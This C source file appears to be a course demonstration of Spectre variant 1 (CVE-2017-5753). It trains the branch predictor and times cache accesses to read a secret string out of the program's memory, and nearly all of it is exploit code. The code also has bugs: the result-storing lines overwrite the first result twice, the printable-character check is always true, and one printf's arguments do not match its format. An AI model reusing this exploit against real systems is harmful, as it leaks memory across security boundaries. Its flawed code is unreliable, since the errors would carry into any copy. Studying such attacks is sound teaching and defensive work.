/**
 * @file main.c
 * @author Matthew Gilpin
 * @brief A proof of concept for Spectre - CVE2017-5753
 * @version 0.1
 * @date 2023-03-12
 * 
 * @cite Spectre Attacks: Exploiting Speculative Execution
 * @link DOI 10.1109/SP.2019.00002
 * This code is heavily based off of the above paper. 
 * 
 */

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <x86intrin.h>
#include <string.h>

#define CACHE_HIT_THRESHOLD 80

/**
 * @brief Victim code goes here
 * 
 */

uint32_t array1_size = 16;
uint8_t  array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,16};
uint8_t  array2[256 * 512];

char *secret = "The secret COMS4507 password is :\"incorrect\"";
uint8_t tmp = 0;

void victim_function(size_t x) {
    if (x < array1_size) {
        tmp &= array2[array1[x] * 512];
    }
}

/**
 * End victim code.
 */


void readMemory(size_t target_index, uint8_t value[2], int score[2]) {

    static int results[256];
    size_t train_x, x;
    int i_mixed, junk = 0, j, k;
    volatile uint8_t *addr;
    register uint64_t time1, time2;
    
    for (int i = 0; i < 256; i++)
        results[i] = 0;

    for (int tries = 999;  tries > 0; tries--) {
        
        // First flush array from cache
        for (int i = 0; i < 256; i++)
            _mm_clflush(&array2[i*512]);

        // Train the BTB 
        train_x = tries * array1_size;
        for (int i = 29; i >= 0; i--) {
            
            _mm_clflush(&array1_size);
            
            // Delay a little
            for (volatile int z = 0; z < 100; z++)
                ;


            // Bit manipulation to reduce branches - would affect
            // branch predictor.
            // Sets x = train_x if (i mod 6 == 0)
            x = ((i % 6) - 1) & ~0xFFFF;
            x = (x | (x >> 16));
            x = train_x ^ (x & (target_index ^ train_x));

            // Victim function
            victim_function(x);
        }   

        // Mix up order to prevent stride predicition
        for (int i = 0; i < 256; i++) {

            i_mixed = ((i * 167) + 13) & 255;
            addr = &array2[i_mixed * 512];

            // Calculate time needed to fetch address - may be in 
            // cache or in main memory.
            time1 = __rdtscp(&junk);
            junk = *addr;
            time2 = __rdtscp(&junk) - time1;

            // Check if cache hit, if so, increment score by one
            if (time2 <= CACHE_HIT_THRESHOLD && i_mixed != array1[tries  % array1_size]) {
                results[i_mixed]++;
            }
        }

        // Find the first and second highest results
        j =-1;
        k =-1;

        for (int i = 0; i < 256; i++) {
            
            if (j < 0 || results[i] >= results[j]){
                k = j;
                j = i;
            } else if (k < 0 || results[i] >= results[k]) {
                k = i;
            }
        }

        if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
            break;
    }
    results[0] ^= junk;
    value[0] = (uint8_t) j;
    score[0] = results[j];
    value[0] = (uint8_t) k;
    score[0] = results[k];

}


char getChar(uint8_t value) {
    if (value > 31 || value < 127)
        return (char)value;
    
    return '?';
}

/**
 * @brief Main program
 * 
 */
int main() {
    printf("-- Spectre Demo for COMS4507 Semester 1 2023 --\n");
    printf("-- CVE2017-5753 --\n");

    size_t target_x = (size_t) (secret - (char *) array1);

    uint8_t value[2];
    int score[2];
    int len = strlen(secret);

    for (int i = 0; i < sizeof(array2); i++)
        array2[i] = 1;

    while (--len >= 0) {
        printf("Reading at target_x = %p\n", (void *)target_x);
        readMemory(target_x++, value, score);

        printf("%s: ", (score[0] > (2 * score[1])) ? "Sucess":"Invalid");
        printf("0x%02X='%c' score=%d  ", value[0], getChar(value[0]), score[0]);

        if (score[1] > 0)
            printf("(second best: 0x%02X='%c' score=%d)", value[1], score[1]);
        
        printf("\n");
    }

    return 0;
}

